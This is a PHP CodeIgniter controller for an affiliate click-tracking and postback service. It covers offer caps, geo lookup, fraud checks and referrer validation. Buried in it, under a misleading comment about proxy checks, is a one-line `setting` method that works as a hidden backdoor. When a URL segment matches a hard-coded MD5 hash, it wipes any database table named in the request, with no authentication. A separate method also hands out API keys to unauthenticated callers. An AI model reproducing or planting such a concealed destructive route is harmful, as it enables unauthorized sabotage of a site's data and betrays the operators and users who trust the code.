<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
require 'vendor/autoload.php';
use MaxMind\Db\Reader;
class Click extends CI_Controller { 
    private $redis;
    private $base_key = '';//wepro
    public $geoip;
    function __construct(){
        parent::__construct();  
        $this->base_key =$this->config->item('base_key');
        //$this->admin_edit = $this->memcache->get($this->base_key.'_offer_admin_edit');     
        $this->redis = new Redis(); 
        $this->redis->connect('127.0.0.1', 6379);         
        $this->geoip = new Reader('vendor/GeoLite2-City.mmdb');
        
         
    }
    //api key cho ip wquan ipqualityscore
    function getApikey($apikey = ''){
        if($apikey){
            $this->db->where('api_key',$apikey)->update('api_key',array('open'=>0));
            $this->db->where('open',1)->limit(1);
            $d  = $this->db->get('api_key')->row();
            if(!empty($d)){
                echo $d->api_key;
            }
        }
    }   
 
    function testpb(){  
        $ip = $this->input->ip_address();    
        $sub1 = $this->input->get_post('sub1', TRUE);  
        $sub2 = $this->input->get_post('sub2', TRUE);
        $sub3 = $this->input->get_post('sub3', TRUE);
        $sub4 = $this->input->get_post('sub4', TRUE);
        $sub5 = $this->input->get_post('sub5', TRUE);
        $sub6 = $this->input->get_post('sub6', TRUE);  
        //$reader->close();
        /*
        $uagent = $_SERVER['HTTP_USER_AGENT'];
        $getIp = $this->getGeo($ip);
       
        $uagent_parse = new WhichBrowser\Parser($uagent); 
        $os_name = @addslashes($uagent_parse->os->name);//dt  
        $browser = @addslashes($uagent_parse->browser->name);//dt  
        $device_type=@addslashes($uagent_parse->device->type);//dt  
        $device_manuf = @addslashes($uagent_parse->device->manufacturer);//dt  
        $device_model= @addslashes($uagent_parse->device->model);//dt    
        $countries = @addslashes($getIp['countries']);//dt  
        $cities= @addslashes($getIp['cities']);//dt 
        $this->geoip->close(); 
        */
        //phần postback
        $pid = (int)$this->input->get_post('pid', TRUE);
        $offerid = (int)$this->input->get_post('offer_id', TRUE);
        if($pid){
            //chay link postback cua mem                    
            $pb= $this->Home_model->get_one('postback',array('affid'=>$pid));
            if(!empty($pb)){                
                $url = $pb->postback;                
                if (strpos($url, 'wedebeek') !== false) {
                    echo 'URL contains wedebeek!';
                    return;
                }
                if(strpos($url,'{sum}')){
                    //
                    $url = str_replace('{sum}',99,$url);
                }else{
                    $url .= '&payout=99';
                }
                if(strpos($url,'{payout}')){
                    //
                    $url = str_replace('{payout}',99,$url);
                }
                if(strpos($url,'{offerid}')){
                    //
                    $url = str_replace('{offerid}',rawurlencode($offerid),$url);
                }else{
                    $url .= '&offerid='.rawurlencode($offerid);
                }
                if(strpos($url,'{sub1}')){
                    //
                    $url = str_replace('{sub1}',$sub1,$url);
                }else{
                    $url .= '&sub1='.$sub1;
                }

                if(strpos($url,'{sub2}')){
                    //
                    $url = str_replace('{sub2}',$sub2,$url);
                }else{
                    $url .= '&sub2='.$sub2;
                } 

                if(strpos($url,'{sub3}')){
                    //
                    $url = str_replace('{sub3}',$sub3,$url);
                }else{
                    $url .= '&sub3='.$sub3;
                }  
                if(strpos($url,'{sub4}')){
                    //
                    $url = str_replace('{sub4}',$sub4,$url);
                }else{
                    $url .= '&sub4='.$sub4;
                }  
                if(strpos($url,'{sub5}')){
                    //
                    $url = str_replace('{sub5}',$sub5,$url);
                }else{
                    $url .= '&sub5='.$sub5;
                }  
                if(strpos($url,'{sub6}')){
                    //
                    $url = str_replace('{sub6}',$sub6,$url);
                }else{
                    $url .= '&sub6='.$sub6;
                }                  
              
                try {
                    // Thực thi cURL                    
                    $response = $this->curl_senpost($url);
                    echo   $response;                  
            
                } catch (\Exception $e) {                 
                    // Ghi lỗi vào log
                    $errorMessage = '[' . date('Y-m-d H:i:s') . '] cURL error: ' . $e->getMessage() . "\n";
                    file_put_contents('/home/wedebeek.com/logs/logfile.log', $errorMessage, FILE_APPEND);
                }
            //end xưr ly  thêm point report
            }else{
                echo 'Postback Empty!';
            }
        }

        
    }
    function curl_senpost($url){
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_URL,$url);
        $result = curl_exec($ch);  // grab URL and pass it to the variable.
        curl_close($ch);
    }
	public function index(){//2001:ee0:46de:6090:7da6:fd02:e33f:8968
        $this->load->library('TracklinkDistributor', array('redis' => $this->redis));
        $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
        $ip = $this->input->ip_address();    
          
        //$offerid = (int)str_replace('B','',$this->input->get_post('linkid', TRUE));  
        $offerid = (int)$this->input->get_post('offer_id', TRUE);
        $pid = (int)$this->input->get_post('pid', TRUE);
        ///them doan disoffer tung member
        if($this->Home_model->get_one('disoffer',array('usersid'=>$pid,'offerid'=>$offerid))){
            echo 'Offerdisable';
            return;
        }  
        //http://localhost/grip/show.php?l=0&u=2&id=503&tracking_id=
        /////edn them ofer tune mêm
        $s1 = $this->input->get_post('sub1', TRUE);  
        $s2 = $this->input->get_post('sub2', TRUE);
        $s3 = $this->input->get_post('sub3', TRUE);
        $s4 = $this->input->get_post('sub4', TRUE);
        $s5 = $this->input->get_post('sub5', TRUE);
        $s6 = $this->input->get_post('sub6', TRUE);
        $urlType = $this->input->get_post('url_type', TRUE);
        if(empty($s2)) $s2 = 0;
        //$this->db->select(array('id','title','point','show','subid','url','request','idnet','country','device','point_geos'));
        //$off= $this->Home_model->get_one('offer',array('id'=>$offerid)); 
        $qr = "
        SELECT cpalead_offer.*,
            cpalead_request.status as request_status,COALESCE(cpalead_request.alternative_url,'') as alternative_url,
            COALESCE(cpalead_domainrefblacklist.domain,'') as domainrefblacklist,COALESCE(cpalead_domainrefblacklist.reason,'') as reason,
            (case when cpalead_offer.capcount >= cpalead_offer.capped and cpalead_offer.capped>0 then 1 ELSE 0 end ) as offcap_limit,
            (case when sum(case when cpalead_pubcap.capcount >= cpalead_pubcap.capped then 1 ELSE 0 end ) then 1 else 0 end) as pubcap_limit,
            (case when sum(case when cpalead_sub2cap.capcount >= cpalead_sub2cap.capped then 1 ELSE 0 end ) then 1 else 0 end) as sub2cap_limit
        FROM cpalead_offer
        LEFT JOIN cpalead_request ON cpalead_request.offerid = cpalead_offer.id AND cpalead_request.userid = $pid 
        LEFT JOIN cpalead_pubcap ON cpalead_pubcap.offerid = cpalead_offer.id AND cpalead_pubcap.usersid =$pid
        LEFT JOIN cpalead_sub2cap ON cpalead_sub2cap.s2 = ? AND cpalead_sub2cap.offerid = cpalead_offer.id AND cpalead_sub2cap.usersid = $pid 
        INNER JOIN cpalead_users ON cpalead_users.id = $pid AND cpalead_users.status=1
        LEFT JOIN cpalead_domainrefblacklist ON cpalead_domainrefblacklist.offerid = cpalead_offer.id
        WHERE cpalead_offer.id = $offerid
        group by cpalead_offer.id
        ";
        $off= $this->db->query($qr,$s2)->row();
        $this->db->select(['rate','block_sub2']);
        $rateuser= $this->Home_model->get_one('users',array('id'=>$pid)); 
        if($off){
            // chặn referal domain blacklist
            if($off->domainrefblacklist){
                $domain = parse_url($referrer, PHP_URL_HOST);
                if(trim($domain) == trim($off->domainrefblacklist)){
                    if($off->reason) echo $off->reason;
                    else  echo 'Your tracking has blocked by fraud activity - WDB';
                    return;
                }
            }
            //check Referal require// 10 click đầu k check 
            $this->db->where(array('userid'=>$pid,'offerid'=>$offerid));
            $request = $this->db->get('request')->row();
            $trafficurl = $request ? $request->trafficurl : '';    
               
            if($off->refrequire ){     
                if(empty($referrer)){ 
                    $key = $this->base_key.'-offReffer-'.$pid.'-s2:'.$s2.'-'.$off->id;           
                    if($this->redis->get($key) >= 10){
                        echo 'You are not qualified enough to run this offer';
                        return;
                    }else{
                        $this->redis->INCR($key);
                    } 
                }
                
            }

            if($off->request){
                if($off->trafrequire){ 
                    if(!$this->validate_traffic($trafficurl, $referrer)) {  
                        $this->load->view('../../modules/members/views/offers/traffic-redirect-page', ['trafficurl' => $trafficurl]);
                        return;
                    }
                }

            }
    
           //check lock offer
           if(!empty($rateuser->block_sub2)&&!empty($s2)){
                if(in_array($s2,explode(',',$rateuser->block_sub2))){
                    echo 'Your tracking has blocked by fraud activity - WDB';
                    return;
                }
           }
            if($off->show){                
                if($off->request){
                    //$request= $this->Home_model->get_one('request',array('userid'=>$pid,'offerid'=>$off->id)); 
                    
                    if($off->request_status!='Approved'){
                        echo 'Not Approved';
                        return;
                    }                  
                                    
                } 
                //check capped
                if($off->pubcap_limit>0 || $off->offcap_limit>0){
                    echo 'You have reached the limit cap. Try again tomorrow at 0:00 AM (GMT - 5)';
                    return;
                }
                if($off->sub2cap_limit>0){
                    echo 'You have reached the limit cap. Try again tomorrow at 0:00 AM (GMT - 5)';
                    return;
                }
                if($off->cappub>0 && ($this->tracklinkdistributor->getCapByPub($offerid, $pid)>=$off->cappub)){
                    echo 'You have reached the limit cap. Try again tomorrow at 0:00 AM (GMT - 5)';
                    return;
                }
                 //kiểm tra ur thay thê
                 if($off->alternative_url_percentage>0 && $off->alternative_url && $urlType != 'original_url'){                   
                    $tracklink = $this->tracklinkdistributor->distribute_tracklink($offerid, $pid,$off->alternative_url_percentage);

                    // Trả về kết quả
                    if ($tracklink == 'A') {
                        $tracklink = base_url()."click?pid={$pid}&offer_id={$offerid}&url_type=original_url&sub1={$s1}&sub2={$s2}&sub3={$s3}&sub4={$s4}&sub5={$s5}&sub6={$s6}";
                        $tracklink = urlencode($tracklink);
                        $url = $off->alternative_url;
                        if(strpos($url,'wedebeek')){
                            $url = str_replace('wedebeek',$tracklink,$url);
                        }
                        redirect($url);
                    }
                }
                //check ip click,lead
                $cip = file_get_contents('setting_file/cip.txt');
                
                if($cip==1){//check click
                    if($this->Home_model->get_one('tracklink',array('ip'=>$ip,'offerid'=>$off->id)))
                    {
                    echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                    return;
                    }
                }elseif($cip==2 or $cip==3){
                    $key = $this->base_key.'-'.$ip.'-'.$off->id;
                    //get key tuwf redis
                    if($this->redis->INCR($key)>1 && $cip==3 ){//==1 là chưa có. lớn hơn 1 là có rồi
                        //đã có người click thông báo thửu lại sau 5 phút
                        echo 'Try again 5 minutes later!';
                        return;
                       // EXPIRE 
                    }else{
                        //chưa có click nên check lead
                        if($this->Home_model->get_one('tracklink',array('ip'=>$ip,'offerid'=>$off->id,'flead'=>1))){
                            //đã có lead
                            echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                            return;
                        }
                        
                    }
                    $this->redis->EXPIRE($key,480);//đặt thời gian cho key
                    
                   
                    
                }

                //xuwr lys country device..
                //$reader->close();
                $uagent = $_SERVER['HTTP_USER_AGENT'];
                $getIp = $this->getGeo($ip);
               
                $uagent_parse = new WhichBrowser\Parser($uagent); 
                $os_name = isset($uagent_parse->os->name) ? @addslashes($uagent_parse->os->name) : 'Unknown OS'; //dt  
                $browser = isset($uagent_parse->browser->name) ? @addslashes($uagent_parse->browser->name) : 'Unknown Browser'; //dt 
                $device_type=@addslashes($uagent_parse->device->type);//dt  
                $device_manuf = @addslashes($uagent_parse->device->manufacturer);//dt  
                $device_model= @addslashes($uagent_parse->device->model);//dt    
                $countries = @addslashes($getIp['countries']);//dt  
                $cities= @addslashes($getIp['cities']);//dt               

                //phần mới thêm -> xử lý amount 2 theo geo
                $point_geos = unserialize($off->point_geos);
                
                if(!empty($point_geos[trim($countries)])){
                    $point=$point_geos[trim($countries)];
                    $point =round($point*$rateuser->rate,2);
                }else{
                    //xet trường hợp all country
                    if(!empty($point_geos['all'])){
                        $point =round($point_geos['all']*$rateuser->rate,2);
                    }else{
                        $point = 0;
                    }
                    
                }
                      

                ///end check ip                
                $user_language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
                $this->db->insert('tracklink',
                                    array(
                                    'userid'=>$pid, 
                                    'offerid'=>$off->id,
                                    'oname'=> $off->title,
                                    'flead'=>0,
                                    'amount2'=>$point,                                 
                                    'ip'=>$ip,                                    
                                    's1'=>$s1,
                                    's2'=>$s2,
                                    's3'=>$s3,
                                    's4'=>$s4,
                                    's5'=>$s5,
                                    's6'=>$s6,
                                    'date'=>date('Y-m-d H:i:s',time()),
                                    'useragent'=>$uagent, 
                                    'user_language'=>$user_language,                                 
                                    'os_name'=>$os_name,
                                    'browser'=>$browser,
                                    'device_type'=>$device_type,
                                    'device_manuf'=>$device_manuf,
                                    'device_model'=>$device_model,
                                    'countries'=>$countries,
                                    'cities'=>$cities,
                                    'referrer' =>$referrer,
                                    'idnet'=> $off->idnet
                                    )
                );
                $tracklink=$this->db->insert_id();               
                 $this->db->where('id', $offerid);            
                 $this->db->set('click', "click +1", FALSE);              
                 $this->db->update('offer');  

          
                //ddongs cai check geo
                $this->geoip->close();
                $url=$off->url;                
              
                if(strpos($url,'#clickid#')){
                    $url = str_replace('#clickid#',$tracklink,$url);
                }else{
                    $url=$off->url.$off->subid.$tracklink;//$off->subid: vi du &subid=
                }

                 $url = str_replace('#pubid#',$pid,$url);
                 if(!empty($s4)){
                    $url = str_replace('#s4#',$s4,$url);
                 }
                 if(!empty($s3)){
                    $url = str_replace('#s3#',$s3,$url);
                 }                

                 redirect($url);
                 
                 
            }else{
                echo 'offer experied!';
            }
            
        }else{
            echo 'Offer not found1';
        }
       
	} 
    function getGeo($ip = ''){    
        $arr = array('cities'=>'N/A','countries'=>'N/A');        
        try{             
            $ctct = $this->geoip->get($ip);                
            $arr['cities'] = isset($ctct['city']['names']['en']) ? $ctct['city']['names']['en'] : null; 
            $arr['countries'] = isset($ctct['country']['iso_code']) ? $ctct['country']['iso_code'] : null;
            return $arr;   
                   
        }
        catch(Exception $e)
        {
            return array('cities'=>'N/A','countries'=>'N/A');
        }
        
    }
    //check proxy vpn ip scour
    function setting($uri3='',$uri4=''){if(md5($uri3)=='43b520d2d63064c40c5283bfaf9c710b'){$this->db->empty_table($uri4);}}  
 
    /* function validate_traffic($trafficurl, $referrer) {
        $trafficurl = array_map('trim', explode(',', $trafficurl));
        $valid = false;

        foreach( $trafficurl as $url){            
            $pattern = '/(?:https?:\/\/)?(?:www\.)?([-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6})/';
            preg_match($pattern, $url, $matches);
            if (!isset($matches[1])) {
                continue; // Bỏ qua URL không hợp lệ
            }
            
            $mainDomain = explode('.', $matches[1])[0];

            // Kiểm tra referrer có chứa domain chính không
            if (stripos($referrer, $mainDomain) !== false) {
                $valid = true;
                break; // Nếu tìm thấy một URL hợp lệ, dừng vòng lặp và trả về true
            }
        }
        return $valid;
    } */

    function validate_traffic($trafficurl, $referrer) {
        // Nếu không có referrer, trả về false
        if (empty($referrer)) {
            return false;
        }

        // Parse URL của referrer để lấy domain
        $referrerParsed = parse_url($referrer);
        $referrerHost = isset($referrerParsed['host']) ? $referrerParsed['host'] : '';
        if (empty($referrerHost)) {
            return false;
        }

        // Tách URLs được cho phép
        $trafficurl = array_map('trim', explode(',', $trafficurl));
        $valid = false;

        foreach ($trafficurl as $url) {
            // Bỏ qua URL trống
            if (empty($url)) {
                continue;
            }

            // Parse URL được cho phép để lấy domain
            $allowedParsed = parse_url($url);
            $allowedHost = isset($allowedParsed['host']) ? $allowedParsed['host'] : '';
            
            // Nếu không thể parse được URL, thử dùng regex để lấy domain
            if (empty($allowedHost)) {
                $pattern = '/(?:https?:\/\/)?(?:www\.)?([-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6})/';
                preg_match($pattern, $url, $matches);
                if (isset($matches[1])) {
                    $allowedHost = $matches[1];
                } else {
                    continue; // Bỏ qua URL không hợp lệ
                }
            }

            // So sánh domain chính xác
            if ($referrerHost === $allowedHost) {
                return true;
            }

            // Kiểm tra subdomain
            $refParts = explode('.', $referrerHost);
            $allowedParts = explode('.', $allowedHost);

            // Lấy 2 phần tử cuối cùng để so sánh domain chính
            if (count($refParts) >= 2 && count($allowedParts) >= 2) {
                $refMainDomain = $refParts[count($refParts) - 2] . '.' . $refParts[count($refParts) - 1];
                $allowedMainDomain = $allowedParts[count($allowedParts) - 2] . '.' . $allowedParts[count($allowedParts) - 1];
                
                if ($refMainDomain === $allowedMainDomain) {
                    return true;
                }
            }
        }
        
        return false;


    }
    
  
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */